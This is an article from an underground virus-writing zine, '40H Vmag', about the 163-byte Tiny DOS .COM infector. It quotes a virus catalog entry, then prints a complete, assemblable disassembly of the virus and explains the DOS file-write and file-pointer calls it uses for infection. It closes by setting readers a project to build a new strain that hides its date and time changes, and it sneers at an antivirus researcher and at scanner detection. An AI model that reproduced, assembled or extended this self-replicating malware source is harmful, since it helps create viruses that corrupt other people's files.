   ; 40H Vmag Issue 1 Volume 1                                               00001
   ;
   ;
   ;                           - VIRUS SPOTLIGHT -
   ;
   ;
   ;      The first virus I would like to spotlight is the Tiny virus, lets see
   ; what our good friend Patti Hoffman (bitch) has written about it.
   ;
   ;  Name:        Tiny
   ;  Aliases:     163 COM Virus, Tiny 163 Virus, Kennedy-163
   ;  V Status:    Rare
   ;  Discovery:   June, 1990
   ;  Symptoms:    COMMAND.COM & .COM file growth
   ;  Origin:      Denmark
   ;  Eff Length:  163 Bytes
   ;  Type Code:   PNCK - Parasitic Non-Resident .COM Infector
   ;  Detection Method:  ViruScan V64+, VirexPC, F-Prot 1.12+, NAV, IBM Scan 2.00+
   ;  Removal Instructions: Scan/D, F-Prot 1.12+, or Delete infected
   ; files
   ;  General Comments:
   ;        The 163 COM Virus, or Tiny Virus, was isolated by Fridrik Skulason
   ;        of Iceland in June 1990.  This virus is a non-resident generic
   ;        .COM file infector, and it will infect COMMAND.COM.
   ;
   ;        The first time a file infected with the 163 COM Virus is executed,
   ;        the virus will attempt to infect the first .COM file in the
   ;        current directory.  On bootable diskettes, this file will normally
   ;        be COMMAND.COM.  After the first .COM file is infected,each time
   ;        an infected program is executed another .COM file will attempt to
   ;        be infected.  Files are infected only if their original length is
   ;        greater than approximately 1K bytes.
   ;
   ;        Infected .COM files will increase in length by 163 bytes, and have
   ;        date/time stamps in the directory changed to the date/time the
   ;        infection occurred.  Infected files will also always end with this
   ;        hex string: '2A2E434F4D00'.
   ;
   ;        This virus currently does nothing but replicate, and is the
   ;        smallest MS-DOS virus known as of its isolation date.
   ;
   ;        The Tiny Virus may or may not be related to the Tiny Family.
   ;        ^like she'd know the difference!
   ;
   ; OK, Theres the run down on the smallest MS-DOS virus known to man.  As for
   ; it being detected by SCAN we'll see about that.
   ;
   ; Here is a dissasembly of the virus, It can be assembled under Turbo Assembler
   ; or MASM.
   ;
   ; -----------------------------------------------------------------------------

   PAGE  59,132


   data_2e         equ     1ABh                    ;start of virus

   seg_a           segment byte public             ;
                   assume  cs:seg_a, ds:seg_a      ;assume cs, ds - code


                   org     100h                    ;orgin of all COM files
   s               proc    far

   start:
                   jmp     loc_1                   ;jump to virus


   ;this is a replacement for an infected file

                   db      0CDh, 20h, 7, 8, 9      ;int 20h
                                                   ;pop es

   loc_1:
                   call    sub_1                   ;



   s               endp


   sub_1           proc    near                    ;
                   pop     si                      ;locate all virus code via
                   sub     si,10Bh                 ;si, cause all offsets will
                   mov     bp,data_1[si]           ;change when virus infects
                   add     bp,103h                 ;a COM file
                   lea     dx,[si+1A2h]            ;offset of '*.COM',0 - via SI
                   xor     cx,cx                   ;clear cx - find only normal
                                                   ;attributes
                   mov     ah,4Eh                  ;find first file
   loc_2:
                   int     21h                     ;

                   jc      loc_6                   ;no files found? then quit
                   mov     dx,9Eh                  ;offset of filename found
                   mov     ax,3D02h                ;open file for read/write access
                   int     21h                     ;

                   mov     bx,ax                   ;save handle into bx
                   mov     ah,3Fh                  ;read from file
                   lea     dx,[si+1A8h]            ;offset of save buffer
                   mov     di,dx                   ;
                   mov     cx,3                    ;read three bytes
                   int     21h                     ;

                   cmp     byte ptr [di],0E9h      ;compare buffer to virus id
                                                   ;string
                   je      loc_4                   ;
   loc_3:
                   mov     ah,4Fh                  ;find the next file
                   jmp     short loc_2             ;and test it
   loc_4:
                   mov     dx,[di+1]               ;lsh of offset
                   mov     data_1[si],dx           ;
                   xor     cx,cx                   ;msh of offset
                   mov     ax,4200h                ;set the file pointer
                   int     21h                     ;

                   mov     dx,di                   ;buffer to save read
                   mov     cx,2                    ;read two bytes
                   mov     ah,3Fh                  ;read from file
                   int     21h                     ;

                   cmp     word ptr [di],807h      ;compare buffer to virus id
                   je      loc_3                   ;same? then find another file

   ;heres where we infect a file

                   xor     dx,dx                   ;set file pointer
                   xor     cx,cx                   ;ditto
                   mov     ax,4202h                ;set file pointer
                   int     21h                     ;

                   cmp     dx,0                    ;returns msh
                   jne     loc_3                   ;not the same? find another file
                   cmp     ah,0FEh                 ;lsh = 254???
                   jae     loc_3                   ;if more or equal find another file

                   mov     ds:data_2e[si],ax       ;point to data
                   mov     ah,40h                  ;write to file
                   lea     dx,[si+105h]            ;segment:offset of write buffer
                   mov     cx,0A3h                 ;write 163 bytes
                   int     21h                     ;

                   jc      loc_5                   ;error? then quit
                   mov     ax,4200h                ;set file pointer
                   xor     cx,cx                   ;to the top of the file
                   mov     dx,1                    ;
                   int     21h                     ;

                   mov     ah,40h                  ;write to file
                   lea     dx,[si+1ABh]            ;offset of jump to virus code
                   mov     cx,2                    ;two bytes
                   int     21h                     ;

   ;now close the file

   loc_5:
                   mov     ah,3Eh                  ;close file
                   int     21h                     ;

   loc_6:
                   jmp     bp                      ;jump to original file

   data_1          dw      0                       ;
                   db      '*.COM',0               ;wild card search string


   sub_1           endp
   seg_a           ends
                   end     start


   ; -----------------------------------------------------------------------------
   ;
   ; Its good to start off with a simple example like this.  As you can see
   ; what the virus does is use the DOS 4Eh function to find the firsy COM file
   ; in the directory.  If no files are found the program exits.  If a file is
   ; found it compares the virus id string (the virus jump instruction) to the
   ; first two bytes of the COM file.  If they match the program terminates.
   ; If they don't match the virus will infect the file.  Using two key MS-DOS
   ; functions to infect.
   ;
   ; The first -
   ;
   ; INT 21h Function 42h
   ; SET FILE POINTER
   ;
   ; AH   =   42h
   ; AL   =   method code
   ; BX   =   file handle
   ; CX   =   most significant half to offset
   ; DX   =   least "                       "
   ;
   ; If there is an error in executing this function the carry flag will be set,
   ; and AX will contian the error code.  If no error is encountered
   ;
   ; DX   =   most significant half of file pointer
   ; AX   =   least "                             "
   ;
   ;
   ; The second (and most) important function used by any virus is
   ;
   ;
   ; INT 21h Function 40h
   ; WRITE TO FILE OR DEVICE
   ;
   ; AH    =   40h
   ; BX    =   handle
   ; CX    =   number of bytes to write
   ; DS:DX =   segment of buffer
   ;
   ; Returns
   ;
   ; AX    =   bytes transferred
   ;
   ; on error
   ;
   ; AX    =  Error Code and flag is set.
   ;
   ;
   ; An example of Function 40h is ----
   ;
   ;
   ;      mov     ah,40h                   ;set function
   ;      mov     bx,handle                ;load bx with handle from prev open
   ;      mov     cx,virus_size            ;load cx with # of bytes to write
   ;      mov     dx,offset write_buffer   ;load dx with the offset of what to
   ;                                       ;write to file
   ;      int     21h                      ;
   ;
   ;
   ; This function is used by 98% of all MS-DOS viruses to copy itself to a
   ; victim file.
   ;
   ;
   ; Now heres a sample project -  create a new strain of Tiny, have it restore
   ; the original date and time etc...
   ;
   ;                                                                           HR
